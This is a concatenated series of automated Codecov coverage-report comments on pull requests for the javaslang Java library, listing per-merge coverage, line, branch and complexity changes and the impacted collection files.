 \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n+ Hits          10883      10885     +2   \n+ Misses          203        202     -1   \n+ Partials        122        121     -1\n\nPowered by Codecov. Last update 62533d9...61c9a74. ## Current coverage is 97.11% (diff: 100%)\nMerging #1786 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1786   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n+ Hits          10883      10885     +2   \n+ Misses          203        202     -1   \n+ Partials        122        121     -1\n\nPowered by Codecov. Last update 62533d9...6692b7f. ## Current coverage is 97.10% (diff: 100%)\nMerging #1788 into master will not change coverage\n\ndiff\n@@             master      #1788   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n  Hits          10883      10883          \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update 78c1ac1...a4e5cc3. ## Current coverage is 97.10% (diff: 100%)\nMerging #1789 into master will not change coverage\n\ndiff\n@@             master      #1789   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11208          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1863          \n==========================================\n  Hits          10883      10883          \n  Misses          203        203          \n  Partials        122        122\n\nPowered by Codecov. Last update 9c40d08...81762f8. ## Current coverage is 97.10% (diff: 97.05%)\nMerging #1790 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1790   diff @@\n==========================================\n  Files            87         87          \n  Lines         11208      11242    +34   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1863       1867     +4   \n==========================================\n+ Hits          10885      10916    +31   \n- Misses          202        204     +2   \n- Partials        121        122     +1\n\nPowered by Codecov. Last update e2f9b54...cef355e. ## Current coverage is 97.09% (diff: 75.00%)\nMerging #1791 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1791   diff @@\n==========================================\n  Files            87         87          \n  Lines         11242      11246     +4   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1868     +1   \n==========================================\n+ Hits          10916      10919     +3   \n- Misses          204        205     +1   \n  Partials        122        122\n\nPowered by Codecov. Last update 915558e...5d4f5f7. ## Current coverage is 97.08% (diff: 88.88%)\nMerging #1792 into master will decrease coverage by <.01%\n\ndiff\n@@             master      #1792   diff @@\n==========================================\n  Files            87         87          \n  Lines         11246      11251     +5   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1868       1868          \n==========================================\n+ Hits          10919      10923     +4   \n  Misses          205        205          \n- Partials        122        123     +1\n\nPowered by Codecov. Last update 1d6e1ed...e93f222. ## Current coverage is 97.10% (diff: 100%)\nMerging #1793 into master will not change coverage\n\ndiff\n@@             master      #1793   diff @@\n==========================================\n  Files            87         87          \n  Lines         11242      11242          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1867       1867          \n==========================================\n  Hits          10916      10916          \n  Misses          204        204          \n  Partials        122        122\n\nPowered by Codecov. Last update 139b83a...8597436. ## Current coverage is 97.09% (diff: 100%)\nMerging #1796 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1796   diff @@\n==========================================\n  Files            87         87          \n  Lines         11246      11246          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1868       1868          \n==========================================\n- Hits          10921      10919     -2   \n- Misses          204        205     +1   \n- Partials        121        122     +1\n\nPowered by Codecov. Last update dbf59f6...bef1d73. ## Current coverage is 97.08% (diff: 100%)\nMerging #1799 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1799   diff @@\n==========================================\n  Files            87         87          \n  Lines         11251      11251          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1868       1868          \n==========================================\n- Hits          10925      10923     -2   \n- Misses          204        205     +1   \n- Partials        122        123     +1\n\nPowered by Codecov. Last update 836df3a...b0f03ed. # Codecov Report\nMerging #1801 into master will increase coverage by 0.03%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1801      +/-\n============================================\n+ Coverage     98.13%   98.17%   +0.03%   \n- Complexity     4912     4969      +57   \n============================================\n  Files            88       88            \n  Lines         11272    11343      +71   \n  Branches       1449     1494      +45   \n============================================\n+ Hits          11062    11136      +74   \n+ Misses          114      112       -2   \n+ Partials         96       95       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/javaslang/collection/LinearSeq.java | 100% <\u00f8> (\u00f8) | 16 <\u00f8> (\u00f8) | :x: |\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.47% <\u00f8> (+0.58%) | 102 <\u00f8> (+1) | :white_check_mark: |\n| ...ng/src/main/java/javaslang/collection/CharSeq.java | 100% <\u00f8> (\u00f8) | 338 <\u00f8> (\u00f8) | :x: |\n| ...src/main/java/javaslang/collection/IndexedSeq.java | 100% <\u00f8> (\u00f8) | 33 <\u00f8> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/collection/Seq.java | 95% <\u00f8> (\u00f8) | 50 <\u00f8> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/collection/TreeSet.java | 100% <100%> (\u00f8) | 165 <8> (+9) | :white_check_mark: |\n| ...slang/src/main/java/javaslang/collection/Tree.java | 97.77% <100%> (\u00f8) | 109 <1> (\u00f8) | :x: |\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.76% <100%> (\u00f8) | 236 <\u00f8> (+4) | :white_check_mark: |\n| ...ang/src/main/java/javaslang/collection/BitSet.java | 99.41% <100%> (+0.31%) | 78 <\u00f8> (+1) | :white_check_mark: |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.45% <100%> (+0.27%) | 115 <16> (+10) | :white_check_mark: |\n| ... and 17 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 515b6ae...68649dd. Read the comment docs.. ## Current coverage is 97.08% (diff: 100%)\nMerging #1803 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1803   diff @@\n==========================================\n  Files            87         87          \n  Lines         11283      11305    +22   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1870       1875     +5   \n==========================================\n+ Hits          10954      10976    +22   \n  Misses          207        207          \n  Partials        122        122\n\nPowered by Codecov. Last update b10020a...69c4284. ## Current coverage is 97.08% (diff: 100%)\nMerging #1805 into master will not change coverage\n\ndiff\n@@             master      #1805   diff @@\n==========================================\n  Files            87         87          \n  Lines         11251      11251          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1868       1868          \n==========================================\n  Hits          10923      10923          \n  Misses          205        205          \n  Partials        123        123\n\nPowered by Codecov. Last update 44a6887...791ecac. ## Current coverage is 97.08% (diff: 100%)\nMerging #1806 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1806   diff @@\n==========================================\n  Files            87         87          \n  Lines         11251      11252     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1868       1869     +1   \n==========================================\n+ Hits          10923      10924     +1   \n  Misses          205        205          \n  Partials        123        123\n\nPowered by Codecov. Last update 275bed0...c77bf3a. ## Current coverage is 97.10% (diff: 100%)\nMerging #1814 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1814   diff @@\n==========================================\n  Files            87         87          \n  Lines         11252      11260     +8   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1869       1869          \n==========================================\n+ Hits          10924      10934    +10   \n+ Misses          205        204     -1   \n+ Partials        123        122     -1\n\nPowered by Codecov. Last update 77634fd...7a6fb31. ## Current coverage is 97.09% (diff: 100%)\nMerging #1816 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1816   diff @@\n==========================================\n  Files            87         87          \n  Lines         11260      11269     +9   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1869       1871     +2   \n==========================================\n+ Hits          10932      10942    +10   \n  Misses          205        205          \n+ Partials        123        122     -1\n\nPowered by Codecov. Last update d280cdc...1fc988b. ## Current coverage is 97.08% (diff: 86.66%)\nMerging #1821 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1821   diff @@\n==========================================\n  Files            87         87          \n  Lines         11269      11277     +8   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1871       1869     -2   \n==========================================\n+ Hits          10942      10948     +6   \n- Misses          205        207     +2   \n  Partials        122        122\n\nPowered by Codecov. Last update 842e5f0...baf734d. ## Current coverage is 97.08% (diff: 100%)\nMerging #1823 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1823   diff @@\n==========================================\n  Files            87         87          \n  Lines         11277      11283     +6   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1869       1870     +1   \n==========================================\n+ Hits          10948      10954     +6   \n  Misses          207        207          \n  Partials        122        122\n\nPowered by Codecov. Last update be0b078...c4d9580. ## Current coverage is 97.09% (diff: 100%)\nMerging #1828 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1828   diff @@\n==========================================\n  Files            87         87          \n  Lines         11305      11307     +2   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10976      10978     +2   \n  Misses          207        207          \n  Partials        122        122\n\nPowered by Codecov. Last update 5a3b144...a6eeb56. ## Current coverage is 97.09% (diff: 100%)\nMerging #1829 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1829   diff @@\n==========================================\n  Files            87         87          \n  Lines         11307      11308     +1   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10978      10979     +1   \n  Misses          207        207          \n  Partials        122        122\n\nPowered by Codecov. Last update a8cace8...6f92340. ## Current coverage is 97.09% (diff: 100%)\nMerging #1830 into master will not change coverage\n\ndiff\n@@             master      #1830   diff @@\n==========================================\n  Files            87         87          \n  Lines         11308      11308          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n  Hits          10979      10979          \n  Misses          207        207          \n  Partials        122        122\n\nPowered by Codecov. Last update 0b18aa7...50f9f9c. ## Current coverage is 97.09% (diff: 100%)\nMerging #1831 into master will not change coverage\n\ndiff\n@@             master      #1831   diff @@\n==========================================\n  Files            87         87          \n  Lines         11308      11308          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n  Hits          10979      10979          \n  Misses          207        207          \n  Partials        122        122\n\nPowered by Codecov. Last update 84a4c69...ebcd715. ## Current coverage is 97.25% (diff: 100%)\nMerging #1832 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1832   diff @@\n==========================================\n  Files            87         87          \n  Lines         11308      11314     +6   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10996      11003     +7   \n  Misses          194        194          \n+ Partials        118        117     -1\n\nPowered by Codecov. Last update a65ebc6...805ce87. ## Current coverage is 97.25% (diff: 100%)\nMerging #1833 into master will increase coverage by 0.16%\n\ndiff\n@@             master      #1833   diff @@\n==========================================\n  Files            87         87          \n  Lines         11308      11308          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          10979      10998    +19   \n+ Misses          207        193    -14   \n+ Partials        122        117     -5\n\nPowered by Codecov. Last update caf9666...1673bb6. ## Current coverage is 97.36% (diff: 100%)\nMerging #1834 into master will increase coverage by 0.11%\n\ndiff\n@@             master      #1834   diff @@\n==========================================\n  Files            87         87          \n  Lines         11314      11314          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          11003      11016    +13   \n+ Misses          194        183    -11   \n+ Partials        117        115     -2\n\nPowered by Codecov. Last update b0c6d06...2a120fd. ## Current coverage is 97.40% (diff: 100%)\nMerging #1835 into master will increase coverage by 0.15%\n\ndiff\n@@             master      #1835   diff @@\n==========================================\n  Files            87         87          \n  Lines         11314      11314          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          11003      11020    +17   \n+ Misses          194        179    -15   \n+ Partials        117        115     -2\n\nPowered by Codecov. Last update b0c6d06...fb7936c. ## Current coverage is 97.78% (diff: 100%)\nMerging #1836 into master will increase coverage by 0.28%\n\ndiff\n@@             master      #1836   diff @@\n==========================================\n  Files            87         87          \n  Lines         11314      11302    -12   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1864    -11   \n==========================================\n+ Hits          11031      11052    +21   \n+ Misses          169        149    -20   \n+ Partials        114        101    -13\n\nPowered by Codecov. Last update 951e4e0...090084a. ## Current coverage is 97.62% (diff: 100%)\nMerging #1837 into master will increase coverage by 0.12%\n\ndiff\n@@             master      #1837   diff @@\n==========================================\n  Files            87         87          \n  Lines         11314      11252    -62   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n- Hits          11031      10985    -46   \n+ Misses          169        153    -16   \n  Partials        114        114\n\nPowered by Codecov. Last update 951e4e0...77e2b23. ## Current coverage is 97.48% (diff: 71.42%)\nMerging #1841 into master will decrease coverage by 0.01%\n\ndiff\n@@             master      #1841   diff @@\n==========================================\n  Files            87         87          \n  Lines         11314      11321     +7   \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          11031      11036     +5   \n- Misses          169        171     +2   \n  Partials        114        114\n\nPowered by Codecov. Last update 951e4e0...8472be2. ## Current coverage is 97.50% (diff: 100%)\nMerging #1842 into master will increase coverage by 0.01%\n\ndiff\n@@             master      #1842   diff @@\n==========================================\n  Files            87         87          \n  Lines         11321      11321          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1875       1875          \n==========================================\n+ Hits          11036      11038     +2   \n+ Misses          171        169     -2   \n  Partials        114        114\n\nPowered by Codecov. Last update 2815851...06c311d. ## Current coverage is 97.92% (diff: 100%)\nMerging #1843 into master will increase coverage by 0.13%\n\ndiff\n@@             master      #1843   diff @@\n==========================================\n  Files            87         87          \n  Lines         11309      11309          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1864       1864          \n==========================================\n+ Hits          11059      11074    +15   \n+ Misses          149        138    -11   \n+ Partials        101         97     -4\n\nPowered by Codecov. Last update 82c647d...27df06c. ## Current coverage is 98.07% (diff: 100%)\nMerging #1844 into master will increase coverage by <.01%\n\ndiff\n@@             master      #1844   diff @@\n==========================================\n  Files            87         87          \n  Lines         11247      11247          \n  Methods           0          0          \n  Messages          0          0          \n  Branches       1864       1864          \n==========================================\n+ Hits          11030      11031     +1   \n+ Misses          121        119     -2   \n- Partials         96         97     +1\n\nPowered by Codecov. Last update 52412f3...e7d7be7. # Codecov Report\nMerging #1845 into master will increase coverage by <.01%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1845      +/-\n============================================\n+ Coverage     98.07%   98.07%   +<.01%   \n- Complexity        0     4891    +4891   \n============================================\n  Files            87       87            \n  Lines         11247    11243       -4   \n  Branches       1864     1448     -416   \n============================================\n- Hits          11030    11027       -3   \n+ Misses          121      119       -2   \n- Partials         96       97       +1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.76% <100%> (-0.01%) | 232 <2> (+232) | |\n| ...src/main/java/javaslang/concurrent/FutureImpl.java | 83.54% <\u00f8> (-2.54%) | 21% <\u00f8> (+21%) | |\n| javaslang/src/main/java/javaslang/Lazy.java | 100% <\u00f8> (+7.31%) | 32% <\u00f8> (+32%) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 52412f3...e095a39. Read the comment docs.. # Codecov Report\nMerging #1848 into master will increase coverage by 0.07%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1848      +/-\n============================================\n+ Coverage     98.15%   98.23%   +0.07%   \n- Complexity     4899     5121     +222   \n============================================\n  Files            87       93       +6   \n  Lines         11244    11980     +736   \n  Branches       1448     1519      +71   \n============================================\n+ Hits          11037    11769     +732   \n- Misses          110      112       +2   \n- Partials         97       99       +2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...aslang/src-gen/main/java/javaslang/Function10.java | 100% <100%> (\u00f8) | 10 <10> (?) | |\n| ...vaslang/src-gen/main/java/javaslang/Function9.java | 100% <100%> (\u00f8) | 10 <10> (?) | |\n| javaslang/src-gen/main/java/javaslang/Tuple10.java | 100% <100%> (\u00f8) | 76 <76> (?) | |\n| .../src-gen/main/java/javaslang/CheckedFunction9.java | 100% <100%> (\u00f8) | 15 <15> (?) | |\n| ...est/src-gen/main/java/javaslang/test/Property.java | 100% <100%> (\u00f8) | 21 <2> (+2) | :white_check_mark: |\n| javaslang/src-gen/main/java/javaslang/Tuple9.java | 100% <100%> (\u00f8) | 70 <70> (?) | |\n| ...src-gen/main/java/javaslang/CheckedFunction10.java | 100% <100%> (\u00f8) | 15 <15> (?) | |\n| javaslang/src/main/java/javaslang/$.java | 56% <100%> (+3.82%) | 0 <\u00f8> (\u00f8) | :x: |\n| javaslang/src-gen/main/java/javaslang/Tuple.java | 96.22% <80%> (-3.78%) | 30 <4> (+4) | |\n| javaslang/src-gen/main/java/javaslang/API.java | 97.91% <98.5%> (+0.14%) | 225 <20> (+20) | :white_check_mark: |\n| ... and 6 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update bfd8f8f...2c818b7. Read the comment docs.. # Codecov Report\nMerging #1857 into master will decrease coverage by -0.08%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1857      +/-\n============================================\n- Coverage     98.23%   98.16%   -0.08%   \n+ Complexity     5124     4902     -222   \n============================================\n  Files            93       87       -6   \n  Lines         11986    11250     -736   \n  Branches       1520     1449      -71   \n============================================\n- Hits          11775    11043     -732   \n+ Misses          112      110       -2   \n+ Partials         99       97       -2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| javaslang/src-gen/main/java/javaslang/Tuple.java | 100% <\u00f8> (+3.77%) | 26 <\u00f8> (-4) | :x: |\n| javaslang/src-gen/main/java/javaslang/API.java | 97.76% <\u00f8> (-0.15%) | 205 <\u00f8> (-20) | |\n| javaslang/src/main/java/javaslang/$.java | 52.17% <\u00f8> (-3.83%) | 0 <\u00f8> (\u00f8) | |\n| ...est/src-gen/main/java/javaslang/test/Property.java | 100% <\u00f8> (\u00f8) | 19 <\u00f8> (-2) | :x: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 80cb7b3...41296b2. Read the comment docs.. # Codecov Report\nMerging #1858 into master will increase coverage by <.01%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1858      +/-\n============================================\n+ Coverage     98.16%   98.16%   +<.01%   \n- Complexity     4902     4906       +4   \n============================================\n  Files            87       87            \n  Lines         11250    11250            \n  Branches       1449     1449            \n============================================\n+ Hits          11043    11044       +1   \n  Misses          110      110            \n+ Partials         97       96       -1\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/TreeSet.java | 100% <100%> (\u00f8) | 156 <2> (+1) | :white_check_mark: |\n| .../main/java/javaslang/collection/LinkedHashSet.java | 95.27% <100%> (\u00f8) | 133 <2> (+1) | :white_check_mark: |\n| ...ng/src/main/java/javaslang/collection/HashSet.java | 94.82% <100%> (\u00f8) | 128 <2> (+1) | :white_check_mark: |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.18% <\u00f8> (+0.6%) | 105% <\u00f8> (+1%) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2b94b13...752d913. Read the comment docs.. # Codecov Report\nMerging #1859 into master will decrease coverage by -0.01%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1859      +/-\n============================================\n- Coverage     98.16%   98.15%   -0.01%   \n- Complexity     4902     4913      +11   \n============================================\n  Files            87       88       +1   \n  Lines         11250    11272      +22   \n  Branches       1449     1449            \n============================================\n+ Hits          11043    11064      +21   \n- Misses          110      113       +3   \n+ Partials         97       95       -2\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/TreeMap.java | 96.99% <\u00f8> (\u00f8) | 148 <\u00f8> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/collection/HashMap.java | 96.29% <\u00f8> (\u00f8) | 116 <\u00f8> (\u00f8) | :x: |\n| .../main/java/javaslang/collection/LinkedHashMap.java | 98.52% <\u00f8> (\u00f8) | 125 <\u00f8> (\u00f8) | :x: |\n| .../java/javaslang/collection/LinkedHashMultimap.java | 94.73% <100%> (+0.29%) | 8 <\u00f8> (\u00f8) | :x: |\n| ...c/main/java/javaslang/collection/HashMultimap.java | 94.73% <100%> (+0.29%) | 8 <\u00f8> (\u00f8) | :x: |\n| ...c/main/java/javaslang/collection/TreeMultimap.java | 90.69% <50%> (-3.06%) | 8 <\u00f8> (\u00f8) | |\n| .../src/main/java/javaslang/collection/Multimaps.java | 90% <90%> (\u00f8) | 6 <6> (?) | |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.18% <\u00f8> (+0.6%) | 105% <\u00f8> (+1%) | :white_check_mark: |\n| ...src/main/java/javaslang/concurrent/FutureImpl.java | 86.07% <\u00f8> (+2.53%) | 22% <\u00f8> (+1%) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 2b94b13...4657f00. Read the comment docs.. # Codecov Report\nMerging #1860 into master will not change coverage.\n\n```diff\n@@           Coverage Diff            @@\nmaster   #1860   +/-\n========================================\n  Coverage      98.1%   98.1%         \n  Complexity     4983    4983         \n========================================\n  Files            88      88         \n  Lines         11359   11359         \n  Branches       1498    1498         \n========================================\n  Hits          11144   11144         \n  Misses          113     113         \n  Partials        102     102\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../main/java/javaslang/collection/PriorityQueue.java | 98.63% <\u00f8> (\u00f8) | 99 <\u00f8> (\u00f8) | :x: |\n| ...main/java/javaslang/collection/AbstractsQueue.java | 100% <\u00f8> (+3.57%) | 22 <\u00f8> (-2) | :x: |\n| ...lang/src/main/java/javaslang/collection/Queue.java | 95.91% <75%> (-0.29%) | 190 <2> (+2) | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 5c27580...b0070f8. Read the comment docs.. # Codecov Report\nMerging #1865 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff             @@\nmaster   #1865      +/-\n===========================================\n+ Coverage      98.1%   98.1%   +<.01%   \n- Complexity     4983    4986       +3   \n===========================================\n  Files            88      88            \n  Lines         11359   11361       +2   \n  Branches       1498    1498            \n===========================================\n+ Hits          11144   11146       +2   \n  Misses          113     113            \n  Partials        102     102\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.5% <100%> (+0.05%) | 118 <4> (+3) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 25699ab...7949d57. Read the comment docs.. # Codecov Report\nMerging #1870 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff             @@\nmaster   #1870      +/-\n===========================================\n+ Coverage      98.1%   98.1%   +<.01%   \n- Complexity     4986    4990       +4   \n===========================================\n  Files            88      88            \n  Lines         11361   11367       +6   \n  Branches       1498    1498            \n===========================================\n+ Hits          11146   11152       +6   \n  Misses          113     113            \n  Partials        102     102\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| javaslang/src/main/java/javaslang/control/Try.java | 94.14% <100%> (+0.17%) | 76 <4> (+4) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 13ed17b...678665f. Read the comment docs.. # Codecov Report\nMerging #1872 into master will decrease coverage by -0.03%.\nThe diff coverage is 89.47%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1872      +/-\n============================================\n- Coverage      98.1%   98.07%   -0.03%   \n- Complexity     4990     5052      +62   \n============================================\n  Files            88       88            \n  Lines         11367    11404      +37   \n  Branches       1498     1502       +4   \n============================================\n+ Hits          11152    11185      +33   \n  Misses          113      113            \n- Partials        102      106       +4\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| .../src/main/java/javaslang/collection/SortedSet.java | 100% <\u00f8> (\u00f8) | 3 <\u00f8> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/collection/Map.java | 97.91% <\u00f8> (\u00f8) | 32 <\u00f8> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/collection/Seq.java | 95% <\u00f8> (\u00f8) | 50 <\u00f8> (\u00f8) | :x: |\n| ...g/src/main/java/javaslang/collection/Multimap.java | 96.61% <\u00f8> (\u00f8) | 26 <\u00f8> (\u00f8) | :x: |\n| ...rc/main/java/javaslang/collection/Traversable.java | 96.47% <\u00f8> (\u00f8) | 102 <\u00f8> (\u00f8) | :x: |\n| .../src/main/java/javaslang/collection/SortedMap.java | 66.66% <\u00f8> (\u00f8) | 2 <\u00f8> (\u00f8) | :x: |\n| ...aslang/src/main/java/javaslang/collection/Set.java | 75% <\u00f8> (\u00f8) | 3 <\u00f8> (\u00f8) | :x: |\n| .../src/main/java/javaslang/collection/LinearSeq.java | 100% <\u00f8> (\u00f8) | 16 <\u00f8> (\u00f8) | :x: |\n| ...src/main/java/javaslang/collection/IndexedSeq.java | 100% <\u00f8> (\u00f8) | 33 <\u00f8> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/collection/TreeMap.java | 96.17% <\u00f8> (-0.83%) | 150 <2> (+2) | |\n| ... and 16 more | |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update e15edfb...fec9961. Read the comment docs.. # Codecov Report\nMerging #1874 into master will not change coverage.\nThe diff coverage is n/a.\n\n```diff\n@@            Coverage Diff            @@\nmaster    #1874   +/-\n=========================================\n  Coverage     98.07%   98.07%         \n  Complexity     5052     5052         \n=========================================\n  Files            88       88         \n  Lines         11404    11404         \n  Branches       1502     1502         \n=========================================\n  Hits          11185    11185         \n  Misses          113      113         \n  Partials        106      106\n```\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 55e7cba...4a0a920. Read the comment docs.. # Codecov Report\nMerging #1876 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1876      +/-\n============================================\n+ Coverage     98.07%   98.07%   +<.01%   \n- Complexity     5052     5053       +1   \n============================================\n  Files            88       88            \n  Lines         11404    11405       +1   \n  Branches       1502     1503       +1   \n============================================\n+ Hits          11185    11186       +1   \n  Misses          113      113            \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...ng/src/main/java/javaslang/collection/TreeSet.java | 100% <\u00f8> (\u00f8) | 169 <\u00f8> (\u00f8) | :x: |\n| ...ang/src/main/java/javaslang/collection/BitSet.java | 99.42% <\u00f8> (\u00f8) | 78 <\u00f8> (\u00f8) | :x: |\n| ...ng/src/main/java/javaslang/collection/TreeMap.java | 96.17% <\u00f8> (\u00f8) | 150 <\u00f8> (\u00f8) | :x: |\n| ...in/java/javaslang/collection/AbstractMultimap.java | 95.55% <\u00f8> (\u00f8) | 122 <\u00f8> (\u00f8) | :x: |\n| .../main/java/javaslang/collection/PriorityQueue.java | 98.66% <100%> (\u00f8) | 105 <2> (+1) | :white_check_mark: |\n\nContinue to review full report at Codecov.\n\nLegend - Click here to learn more\n\u0394 = absolute <relative> (impact), \u00f8 = not affected, ? = missing data\nPowered by Codecov. Last update 0f54978...0adcc8d. Read the comment docs.. # Codecov Report\nMerging #1878 into master will increase coverage by <.01%.\nThe diff coverage is 100%.\n\n```diff\n@@             Coverage Diff              @@\nmaster    #1878      +/-\n============================================\n+ Coverage     98.07%   98.08%   +<.01%   \n- Complexity     5053     5054       +1   \n============================================\n  Files            88       88            \n  Lines         11405    11413       +8   \n  Branches       1503     1505       +2   \n============================================\n+ Hits          11186    11194       +8   \n  Misses          113      113            \n  Partials        106      106\n```\n| Impacted Files | Coverage \u0394 | Complexity \u0394 | |\n|---|---|---|---|\n| ...lang/src/main/java/javaslang/collection/Queue.java | 95.94% <\u00f8> (\u00f8) | 194 <\u00f8> (\u00f8) | :x: |\n| ...lang/src/main/java/javaslang/collection/Array.java | 99.53% <\u00f8> (\u00f8) | 241 <\u00f8> (\u00f8) | :x: |\n| ...ang/src/main/java/javaslang/collection/Stream.java | 98.6% <\u00f8> (\u00f8) | 254 <\u00f8> (\u00f8) | :x: |\n| ...slang/src/main/java/javaslang/collection/List.java | 